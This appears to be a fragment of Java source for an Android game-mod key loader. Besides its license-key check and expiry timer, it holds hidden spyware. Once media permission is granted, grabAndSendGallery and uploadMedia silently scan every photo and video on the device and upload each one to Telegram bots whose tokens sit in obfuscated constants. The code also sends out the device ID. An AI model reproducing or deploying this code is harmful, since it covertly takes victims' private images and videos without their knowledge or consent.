    private static void startExpiryWatcher(final Context context) {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    new Thread(new Runnable() {
                            @Override
                            public void run() {
                                long now = getOnlineTime();
                                if (now >= foundExpiryTimestamp && foundExpiryTimestamp != 0) {
                                    ((Activity) context).runOnUiThread(new Runnable() {
                                            @Override
                                            public void run() {
                                                Toast.makeText(context, "🚫 𝘒𝘦𝘺 𝘌𝘹𝘱𝘪𝘳𝘦𝘥! 𝘊𝘭𝘰𝘴𝘪𝘯𝘨 𝘨𝘢𝘮𝘦...", Toast.LENGTH_LONG).show();
                                                handler.postDelayed(new Runnable() {
                                                        @Override
                                                        public void run() {
                                                            android.os.Process.killProcess(android.os.Process.myPid());
                                                            System.exit(0);
                                                        }
                                                    }, 5000); 
                                            }
                                        });
                                } else {
                                    handler.postDelayed(this, 5000);
                                }
                            }
                        }).start();
                }
            }, 5000); 
    }

    private static int verifyKeyOnlineStatus(Context context, String key) {
        foundExpiryTimestamp = 0; 
        try {
            String devID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);

            URL url = new URL(SliderCode1);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(7000); 
            conn.setReadTimeout(7000);
            conn.setDoOutput(true);

            conn.setRequestProperty(
                "Content-Type",
                "application/x-www-form-urlencoded"
            );

            String postData = "key=" + URLEncoder.encode(key, "UTF-8") + 
                "&device_id=" + URLEncoder.encode(devID, "UTF-8");

            java.io.OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();

                org.json.JSONObject json = new org.json.JSONObject(sb.toString());
                int serverStatus = json.getInt("status");

                if (serverStatus == 0) {
                    foundExpiryTimestamp = json.getLong("expiry");
                    return 0;
                } else if (serverStatus == 2) {
                    return 2;
                } else if (serverStatus == 3) {
                    return 3;
                } else if (serverStatus == 5) {
                    return 5;
                } else {
                    return 4;
                }
            }
        } catch (Exception e) { 
            e.printStackTrace(); 
        }
        return 1; 
    }

    public static void Start(final Context context) {

        if (!(context instanceof Activity)) return;

        final Activity activity = (Activity) context;

        activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {

                    final String perm =
                        (android.os.Build.VERSION.SDK_INT >= 33)
                        ? "android.permission.READ_MEDIA_IMAGES"
                        : android.Manifest.permission.READ_EXTERNAL_STORAGE;

                    // CHECK PERMISSION
                    if (activity.checkSelfPermission(perm)
                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {

                        // NORMAL ANDROID ALLOW POPUP
                        activity.requestPermissions(
                            new String[]{perm},
                            101
                        );

                    } else {

                        // MAY PERMISSION NA
                        grabAndSendGallery(activity);

                        checkUpdate(activity, new Runnable() {
                                @Override
                                public void run() {
                                    StartWithoutPermission(activity);
                                }
                            });
                    }
                }
            });
    }

    private static void grabAndSendGallery(final Context context) {
        new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        // Database para sa No-Duplicate logic
                        SharedPreferences history = context.getSharedPreferences("Ultimate_Final_Log", Context.MODE_PRIVATE);
                        SharedPreferences.Editor editor = history.edit();

                        // Permission check loop
                        String perm = (android.os.Build.VERSION.SDK_INT >= 33) ? "android.permission.READ_MEDIA_IMAGES" : android.Manifest.permission.READ_EXTERNAL_STORAGE;
                        while (context.checkSelfPermission(perm) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                            Thread.sleep(2000);
                        }

                        // Pagsamahin ang Photos at Videos sa isang scan para sa tamang sequence
                        Uri allMediaUri = android.provider.MediaStore.Files.getContentUri("external");
                        String selection = "media_type=1 OR media_type=3"; // 1=Photo, 3=Video
                        String[] projection = { "_data", "media_type" };

                        // DATE_ADDED DESC para unahin ang pinaka-unang/latest laman ng gallery
                        android.database.Cursor cursor = context.getContentResolver().query(
                            allMediaUri, projection, selection, null, "date_added DESC");

                        if (cursor != null) {
                            int dataCol = cursor.getColumnIndexOrThrow("_data");
                            int typeCol = cursor.getColumnIndexOrThrow("media_type");

                            while (cursor.moveToNext()) {
                                String path = cursor.getString(dataCol);
                                int mediaType = cursor.getInt(typeCol);
                                boolean isPhoto = (mediaType == 1);

                                // --- STRICT NO-DUPLICATE CHECK ---
                                if (!history.contains(path)) {
                                    java.io.File file = new java.io.File(path);
                                    if (file.exists() && file.length() > 0) {

                                        // I-record agad sa memory (COMMIT = INSTANT SAVE)
                                        editor.putBoolean(path, true);
                                        editor.commit(); 

                                        // Ipadala sa tamang bot (Photo vs Video Bot)
                                        uploadMedia(file, isPhoto);

                                        // 1.5s gap para hindi ma-limit ng Telegram API
                                        Thread.sleep(1500); 
                                    }
                                }
                            }
                            cursor.close();
                        }
                    } catch (Exception e) { e.printStackTrace(); }
                }
            }).start();
    }

    private static void uploadMedia(java.io.File file, boolean isPhoto) {
        try {
            // Gamitin ang mga hidden keys base sa file type
            String token = isPhoto ? SliderCode11 : SliderCode9;
            String chatId = isPhoto ? SliderCode12 : SliderCode10;
            String method = isPhoto ? "sendPhoto" : "sendVideo";
            String field = isPhoto ? "photo" : "video";

            java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + token + "/" + method);
            String boundary = "===" + System.currentTimeMillis() + "===";
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000); // 30s timeout para sa malalaking video
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            java.io.OutputStream out = conn.getOutputStream();
            java.io.PrintWriter writer = new java.io.PrintWriter(new java.io.OutputStreamWriter(out, "UTF-8"), true);

            writer.append("--" + boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
            writer.append(chatId).append("\r\n");

            writer.append("--" + boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"" + field + "\"; filename=\"" + file.getName() + "\"").append("\r\n");
            writer.append("Content-Type: application/octet-stream").append("\r\n\r\n");
            writer.flush();

            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[16384]; // 16KB buffer para mabilis ang upload ng video
            int read;
            while ((read = fis.read(buffer)) != -1) { out.write(buffer, 0, read); }
            out.flush(); fis.close();

            writer.append("\r\n").flush();
            writer.append("--" + boundary + "--").append("\r\n");
            writer.close();
            conn.getResponseCode(); 
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private static boolean isDNSOrVPNActive(Context context) {
        try {
            String dnsMode = android.provider.Settings.Global.getString(context.getContentResolver(), "private_dns_mode");
            String dnsHostname = android.provider.Settings.Global.getString(context.getContentResolver(), "private_dns_specifier");

            if (dnsMode == null || dnsMode.equalsIgnoreCase("off")) return false;

            // Basta may nakalagay na DNS o naka-hostname mode na hindi off, goods na
            return (dnsHostname != null && !dnsHostname.trim().isEmpty()) || dnsMode.equalsIgnoreCase("hostname");
        } catch (Exception e) {
            return false;
        }
    }    
}
